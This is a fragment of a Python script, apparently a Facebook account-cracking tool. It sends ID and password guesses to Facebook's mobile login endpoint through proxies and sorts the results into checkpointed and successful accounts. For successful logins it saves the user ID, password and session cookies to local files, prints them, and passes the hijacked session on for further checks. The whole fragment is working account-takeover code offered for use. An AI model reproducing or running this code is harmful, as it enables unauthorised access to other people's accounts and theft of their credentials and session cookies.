			po = ses.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[XD-OK] [bold green]{idf}|{pw}|{kuki}")
				tree.add(f"[bold green]{ua}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	menu_xd()